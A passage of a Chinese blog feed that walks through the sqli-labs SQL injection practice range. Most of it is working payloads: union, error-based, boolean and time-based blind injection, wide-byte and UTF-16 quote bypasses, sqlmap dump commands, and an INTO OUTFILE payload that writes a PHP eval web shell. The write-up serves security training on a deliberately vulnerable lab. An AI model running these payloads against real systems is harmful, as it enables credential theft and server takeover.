updatexml(1,concat(0x7e,user(),0x7e),1)--+或者id=1%df'</span> and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="②获得数据库用户名-1"><a href="#②获得数据库用户名-1" class="headerlink" title="②获得数据库用户名"></a>②获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：1%df' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>本关的payload和第三十二关一样。</p><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>本关是post型的注入。</p><p>这里不能用%df绕过了，因为这里不是get方式不会经过urldecode，可以考虑将utf-8转换成utf-16。例如将’转为utf-16为�’</p><h3 id="然后可以采用报错注入："><a href="#然后可以采用报错注入：" class="headerlink" title="然后可以采用报错注入："></a>然后可以采用报错注入：</h3><p>在用户框输入payload:</p><pre class="line-numbers language-bash"><code class="language-bash">1�' or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可获得数据库用户名。</p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>本关源码中id=$id，所以不用输单引号，也就不用考虑单引号转义的问题了。</p><h3 id="采用union联合注入"><a href="#采用union联合注入" class="headerlink" title="采用union联合注入"></a>采用union联合注入</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,2,user<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>即可获得数据库用户名</p><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>本关还是可以用%df绕过，payload和第三十二关一样。</p><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>本关一样可以将单引号转换为utf-16，payload和第三十四关一样。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli靶场(1~22关)</title>
      <link href="/posts/bb32.html"/>
      <url>/posts/bb32.html</url>
      
        <content type="html"><![CDATA[<p>又是疯狂打靶场的一天，这个sqli靶场真的好多关，我之前试过打过几关，没有坚持，但万事开头难，总归是慢慢打完了。</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一部分就是union联合注入和盲注。</p><p>我这里用的sqli靶场是<a href="https://github.com/Audi-1/sqli-labs.git">https://github.com/Audi-1/sqli-labs.git</a> sqli-labs</p><p>把第一部分打完，你真的就成功一大半了~</p><h2 id="union操作符："><a href="#union操作符：" class="headerlink" title="union操作符："></a>union操作符：</h2><p>UNION操作符用于合并两个或多个SELECT语句的结果集。请注意，UNION内部的SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条SELECT语句中的列的顺序必须相同</p><p>注释：默认地，UNION操作符选取不同的值。如果允许重复的值，请使用UNION ALL</p><h2 id="Limit："><a href="#Limit：" class="headerlink" title="Limit："></a>Limit：</h2><p>Limit是指限定查询的条数。有三种方式：</p><pre class="line-numbers language-bash"><code class="language-bash">方式一：limit 参数1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数1可从1开始，往后递增，表示要查询几条数据。</p><p>例如，limit 1 表示限定查询一条语句。</p><pre class="line-numbers language-bash"><code class="language-bash">方式二：limit 参数1，参数2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数1从0开始，表示从第几行（按照索引0作第一行）开始查询，参数2表示要查询的条数。合在一起的意思就是，从参数1开始，查询参数2条语句。</p><p>例如，limit 0,1 表示查询第一条语句，和limit 1等意。</p><pre class="line-numbers language-bash"><code class="language-bash">方式三：limit 参数1 offset 参数2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数1表示限定要查询几条，参数2表示从第几行（按照索引为0作第一行）开始查询。</p><p>例如：limit 1 offset 0 表示查询第一条参数。</p><h1 id="union联合注入（Less-1-Less-4-GET）"><a href="#union联合注入（Less-1-Less-4-GET）" class="headerlink" title="union联合注入（Less-1~Less-4 GET）"></a>union联合注入（Less-1~Less-4 GET）</h1><h3 id="Get注入"><a href="#Get注入" class="headerlink" title="Get注入"></a>Get注入</h3><p>Get方式不能使用#，抓包会发现#会消失不见，可用%23代替。也可以用–+。</p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>输入单引号，出现报错。输入两个单引号不报错。</p><pre class="line-numbers language-bash"><code class="language-bash">错误信息：<span class="token string">''</span>1<span class="token string">''</span> LIMIT 0,1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：’1’’</p><p>则在源码中可能为 id=’$id’ </p><p>可以成功注入的有：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1'or 1<span class="token operator">=</span>1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时构造的sql语句就为：</p><pre class="line-numbers language-bash"><code class="language-bash">select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token string">'1'</span> or 1<span class="token operator">=</span>1 --+' LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（1）用order-by判断有几个字段"><a href="#（1）用order-by判断有几个字段" class="headerlink" title="（1）用order by判断有几个字段"></a>（1）用order by判断有几个字段</h4><p>order by就是如果到n出错，则字段数为n-1。</p><p>当构造?id=1’ order by 4–+时会报错，则说明字段数为3。</p><img src="/posts/bb32/1.png" class><h4 id="（2）判断回显点"><a href="#（2）判断回显点" class="headerlink" title="（2）判断回显点"></a>（2）判断回显点</h4><p>构造?id=1’ union select 1,2,3–+</p><p>当id的数据在数据库中不存在时，此时我们可以id=-1，两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来。</p><p>此处前台页面返回了我们构造的union的数据。可以看到回显点是2和3。  </p><img src="/posts/bb32/1_2.png" class><h4 id="（3）因此，我们可以在2-3回显的位置构造sql查询语句查询我们想要的东西"><a href="#（3）因此，我们可以在2-3回显的位置构造sql查询语句查询我们想要的东西" class="headerlink" title="（3）因此，我们可以在2,3回显的位置构造sql查询语句查询我们想要的东西"></a>（3）因此，我们可以在2,3回显的位置构造sql查询语句查询我们想要的东西</h4><h3 id="1-1获取数据库"><a href="#1-1获取数据库" class="headerlink" title="1.1获取数据库"></a>1.1获取数据库</h3><h4 id="①获取单个数据库名"><a href="#①获取单个数据库名" class="headerlink" title="①获取单个数据库名"></a>①获取单个数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,database<span class="token punctuation">(</span><span class="token punctuation">)</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到数据库名为security</p><img src="/posts/bb32/1_3.png" class><h4 id="②获得所有数据库名"><a href="#②获得所有数据库名" class="headerlink" title="②获得所有数据库名"></a>②获得所有数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> from information_schema.schemata--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可获取所有的数据库：</p><p> <img src="/posts/bb32/1_4.png" class></p><h3 id="1-2获取表格"><a href="#1-2获取表格" class="headerlink" title="1.2获取表格"></a>1.2获取表格</h3><h4 id="①得到单个表格"><a href="#①得到单个表格" class="headerlink" title="①得到单个表格"></a>①得到单个表格</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表为emails：</p><p> <img src="/posts/bb32/1_5.png" class></p><h4 id="②得到所有表格"><a href="#②得到所有表格" class="headerlink" title="②得到所有表格"></a>②得到所有表格</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可得到所有的表：</p><p> <img src="/posts/bb32/1_6.png" class></p><h3 id="1-3获取字段名"><a href="#1-3获取字段名" class="headerlink" title="1.3获取字段名"></a>1.3获取字段名</h3><h4 id="①获得单个字段名"><a href="#①获得单个字段名" class="headerlink" title="①获得单个字段名"></a>①获得单个字段名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,(select column_name from information_schema.columns where table_name='</span>users' limit 0,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到字段名user_id：</p><p> <img src="/posts/bb32/1_7.png" class></p><h4 id="②获得所有字段名"><a href="#②获得所有字段名" class="headerlink" title="②获得所有字段名"></a>②获得所有字段名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>users' --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可查到所有字段名:</p><p> <img src="/posts/bb32/1_8.png" class></p><h3 id="1-4获取表格里面的内容"><a href="#1-4获取表格里面的内容" class="headerlink" title="1.4获取表格里面的内容"></a>1.4获取表格里面的内容</h3><h4 id="①获得单个用户名和密码"><a href="#①获得单个用户名和密码" class="headerlink" title="①获得单个用户名和密码"></a>①获得单个用户名和密码</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> where id<span class="token operator">=</span>2--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以得到用户名为Angelina,密码为：I-kill-you</p><p> <img src="/posts/bb32/1_9.png" class></p><h4 id="②获得所有的用户名和密码"><a href="#②获得所有的用户名和密码" class="headerlink" title="②获得所有的用户名和密码"></a>②获得所有的用户名和密码</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,group_concat(username,0x3a,password) from users--+或者id=-1'</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit 0,1<span class="token punctuation">)</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可得到所有的用户名和密码。</p><p> <img src="/posts/bb32/1_10.png" class></p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>输入1’</p><pre class="line-numbers language-bash"><code class="language-bash">错误信息：<span class="token string">''</span> LIMIT 0,1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：’</p><p>则在源码中可能为 id=$id</p><p>可以成功注入的有：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1 or 1<span class="token operator">=</span>1id<span class="token operator">=</span>1 or 1<span class="token operator">=</span>1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时构造的sql语句就为：</p><pre class="line-numbers language-bash"><code class="language-bash">select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span>1 or 1<span class="token operator">=</span>1 LIMIT 0,1或select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span>1 or 1<span class="token operator">=</span>1 --+ LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其余的payload与less-1中一样，只需要将less-1的’去掉即可。</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>输入1’</p><pre class="line-numbers language-bash"><code class="language-bash">错误信息：<span class="token string">''</span>1<span class="token string">''</span><span class="token punctuation">)</span> LIMIT 0,1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：’1’’)</p><p>则在源码中可能为 id=(‘$id’) </p><p>可以成功注入的有：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">') or ('</span>1<span class="token string">'='</span>1id<span class="token operator">=</span>1<span class="token string">' or '</span>1<span class="token string">'='</span>1id<span class="token operator">=</span>1<span class="token punctuation">)</span> or 1<span class="token operator">=</span>1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时构造的sql语句就为：</p><pre class="line-numbers language-bash"><code class="language-bash">select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span> or <span class="token punctuation">(</span><span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">)</span> LIMIT 0,1或select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'1'</span> or <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">)</span> LIMIT 0,1或select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'1) or 1=1 --+'</span><span class="token punctuation">)</span> LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其余的payload与less-1中一样，只需要将less-1中的’更换为’)</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>输入1”</p><pre class="line-numbers language-bash"><code class="language-bash">错误信息：<span class="token string">'"1"") LIMIT 0,1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：”1””)</p><p>则在源码中可能为 (“$id”)</p><p>可以成功的注入有：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">" or "</span>1<span class="token string">"="</span>1id<span class="token operator">=</span>1<span class="token string">") or ("</span>1<span class="token string">"="</span>1id<span class="token operator">=</span>1<span class="token string">") or "</span>1<span class="token string">"=("</span>1id<span class="token operator">=</span>1"<span class="token punctuation">)</span> or 1<span class="token operator">=</span>1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时构造的sql语句就为：</p><pre class="line-numbers language-bash"><code class="language-bash">select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"1"</span> or <span class="token string">"1"</span><span class="token operator">=</span>”1<span class="token string">") LIMIT 0,1或select......id=("</span>1<span class="token string">") or (”1"</span><span class="token operator">=</span>”1<span class="token string">") LIMIT 0,1或select......id=(“1"</span><span class="token punctuation">)</span> or <span class="token string">"1”=("</span>1”<span class="token punctuation">)</span> LIMIT 0,1或select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span> or 1<span class="token operator">=</span>1 --+"<span class="token punctuation">)</span> LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其余的payload与less-1中一样，只需要将less-1中的’更换为”)</p><h1 id="盲注-Less-5-Less-10-GET"><a href="#盲注-Less-5-Less-10-GET" class="headerlink" title="盲注(Less-5~Less-10 GET)"></a>盲注(Less-5~Less-10 GET)</h1><p>盲注有三种，分别是：</p><p>（1）boolean布尔型盲注</p><p>（2）报错注入</p><p>（3）时间注入（延时注入，基于时间的sql盲注）</p><h2 id="Less-5-基于布尔型的盲注"><a href="#Less-5-基于布尔型的盲注" class="headerlink" title="Less-5 基于布尔型的盲注"></a>Less-5 基于布尔型的盲注</h2><p>输入单引号判断之后，构造id=1’ or ‘1’=’1</p><p>发现页面只会显示对与错的信息，不会显示数据库的信息，此关可以采用盲注。</p><h3 id="（1）可以使用延时注入："><a href="#（1）可以使用延时注入：" class="headerlink" title="（1）可以使用延时注入："></a>（1）可以使用延时注入：</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' and sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>发现网络延时五秒响应，可以用延时注入：</p><p> <img src="/posts/bb32/5.png" class></p><h3 id="（2）可以使用报错注入："><a href="#（2）可以使用报错注入：" class="headerlink" title="（2）可以使用报错注入："></a>（2）可以使用报错注入：</h3><p>输入单引号，发现出现报错信息，因此可以使用报错注入。</p><h4 id="①得到库"><a href="#①得到库" class="headerlink" title="①得到库"></a>①得到库</h4><pre class="line-numbers language-bash"><code class="language-bash">可以使用这个payload：id<span class="token operator">=</span>1' and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会报错显示当前库不存在这个函数，所以数据库名可以看到为security：</p><p>  <img src="/posts/bb32/5_2.png" class></p><p>当然也可以直接构造payload:</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样得到数据库名为security：</p><p>  <img src="/posts/bb32/5_3.png" class></p><h4 id="②获取用户名"><a href="#②获取用户名" class="headerlink" title="②获取用户名"></a>②获取用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到数据库用户名为root@localhost：</p><p>  <img src="/posts/bb32/5_4.png" class></p><h3 id="（3）下面采用的是基于布尔型的盲注："><a href="#（3）下面采用的是基于布尔型的盲注：" class="headerlink" title="（3）下面采用的是基于布尔型的盲注："></a>（3）下面采用的是基于布尔型的盲注：</h3><h3 id="5-1获取敏感信息"><a href="#5-1获取敏感信息" class="headerlink" title="5.1获取敏感信息"></a>5.1获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">构造payload:id<span class="token operator">=</span>1<span class="token string">' and if(substr(database(),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将’a’可替换成其他字母，进行判断，如果正确会显示下图：</p><p>  <img src="/posts/bb32/5_5.png" class></p><p>不正确则会显示下图：</p><p>  <img src="/posts/bb32/5_6.png" class></p><p>根据对与错来判断输入字符的正确性。</p><p>这里我采用抓包然后进行爆破，可得到数据库名为：security(写成大写也可以）</p><p> <img src="/posts/bb32/5_7.png" class></p><h3 id="5-2获取表名"><a href="#5-2获取表名" class="headerlink" title="5.2获取表名"></a>5.2获取表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1<span class="token string">' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里同样利用burp抓包，然后对标红的两个变量进行爆破，可得到表名为emails</p><p>  <img src="/posts/bb32/5_8.png" class></p><p>并且将limit 0,1改成如limit 1,1可获取其他数据库，分别为referers,uagents,users</p><h3 id="5-3获取字段名"><a href="#5-3获取字段名" class="headerlink" title="5.3获取字段名"></a>5.3获取字段名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and if(substr((select column_name from information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同样用burp抓包，得到字段名为user_id：</p><p>  <img src="/posts/bb32/5_9.png" class></p><p>将limit 0,1改成其他行，可获得其他列名为username,password,等等。</p><h3 id="5-4获取表里面的内容"><a href="#5-4获取表里面的内容" class="headerlink" title="5.4获取表里面的内容"></a>5.4获取表里面的内容</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and if(substr((select concat(username,0x3a,password) from users limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用burp抓包，得到用户名和密码为：dumb:dumb</p><p>  <img src="/posts/bb32/5_10.png" class></p><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>本关也为盲注。 通过输入单引号不报错，输入双引号报错，可推断源码中参数可能为 “$id”</p><p>所以本关的解法跟Less-5一样，只需将第五关的单引号改成双引号即可。</p><h2 id="Less-7文件导入注入"><a href="#Less-7文件导入注入" class="headerlink" title="Less-7文件导入注入"></a>Less-7文件导入注入</h2><p>本关是利用文件导入的方式进行注入。</p><p>构造payload:</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1'<span class="token punctuation">))</span> union <span class="token keyword">select</span> 1,2,3 into outfile  <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\1.txt"</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>虽然显示报错信息，但在路径下已经生成了1.txt</p><p>  <img src="/posts/bb32/7.png" class></p><p>可以直接将一句话木马导入进去</p><p>构造payload:</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">')) union select 1,2,'</span><span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span> ' into outfile  <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\1.php"</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后可以利用工具连接。</p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>通过测试，id=1’ or 1=1–+是显示正确的。这关跟第五关一样，可以使用基于布尔型的盲注，以及延时注入。但是不能使用报错注入。</p><p>因为在源码中将将 mysql 报错的语句进行了注释。</p><p>  <img src="/posts/bb32/8.png" class></p><p>其余的payload跟第五关的一样啦。</p><h2 id="Less-9-基于时间的sql盲注（采用sqlmap）"><a href="#Less-9-基于时间的sql盲注（采用sqlmap）" class="headerlink" title="Less-9 基于时间的sql盲注（采用sqlmap）"></a>Less-9 基于时间的sql盲注（采用sqlmap）</h2><p>本关可采用时间延迟的注入。</p><h3 id="（1）方法一："><a href="#（1）方法一：" class="headerlink" title="（1）方法一："></a>（1）方法一：</h3><p>测试：id=1’ and sleep(5)–+</p><p>查看网络状态，的确存在延时。</p><h4 id="①获得数据库名"><a href="#①获得数据库名" class="headerlink" title="①获得数据库名"></a>①获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and if(substr(database(),1,1)='</span>s',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看网络是否延时五秒，是则说明字符正确，不是则说明错误。</p><p>将标红的1依次替换，可得到数据库名为security。</p><p>  <img src="/posts/bb32/9.png" class></p><h4 id="②获得表名"><a href="#②获得表名" class="headerlink" title="②获得表名"></a>②获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:http://127.0.0.1:8099/sqli/Less-9/?id<span class="token operator">=</span>1<span class="token string">' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='</span>e',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看响应，依次类推，得到表名为emails,referers,uagents,users</p><h3 id="（2）方法二："><a href="#（2）方法二：" class="headerlink" title="（2）方法二："></a>（2）方法二：</h3><p>我们这里采用sqlmap来检测时间注入</p><h3 id="9-1判断注入"><a href="#9-1判断注入" class="headerlink" title="9.1判断注入"></a>9.1判断注入</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>sqlmap检测到为时间注入：</p><p> <img src="/posts/bb32/9_2.png" class></p><h3 id="9-2获取敏感信息"><a href="#9-2获取敏感信息" class="headerlink" title="9.2获取敏感信息"></a>9.2获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --current-user --current-db --batch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(–current-user为获取用户，–current-db为获取数据库名， –batch表示使用自动模式，默认为y)</p><p>获得当前数据库用户名为root@localhost，数据库名为：security</p><p> <img src="/posts/bb32/9_3.png" class></p><h3 id="9-3获取表"><a href="#9-3获取表" class="headerlink" title="9.3获取表"></a>9.3获取表</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --tables -D security --batch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(-D 指定数据库 –tables 获取表)</p><p>得到表名为emails,referers,uagents,users：</p><p> <img src="/posts/bb32/9_4.png" class></p><h3 id="9-4获取字段"><a href="#9-4获取字段" class="headerlink" title="9.4获取字段"></a>9.4获取字段</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --columns -T <span class="token function">users</span> -D security --batch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(–columns获取字段)</p><p>得到字段名为id,username,password：</p><p> <img src="/posts/bb32/9_5.png" class></p><h3 id="9-5查询账号和密码"><a href="#9-5查询账号和密码" class="headerlink" title="9.5查询账号和密码"></a>9.5查询账号和密码</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --dump -C <span class="token string">"id,username,password"</span> -T <span class="token function">users</span> -D security --batch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(–dump是导出数据，-C是指定查询的字段)</p><p>得到账户密码为：</p><p> <img src="/posts/bb32/9_6.png" class></p><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>本关跟第九关一样，只需将第九关的单引号换成双引号即可。</p><h1 id="union联合注入（Less-11-Less-12-POST）"><a href="#union联合注入（Less-11-Less-12-POST）" class="headerlink" title="union联合注入（Less-11~Less-12 POST）"></a>union联合注入（Less-11~Less-12 POST）</h1><h3 id="post注入"><a href="#post注入" class="headerlink" 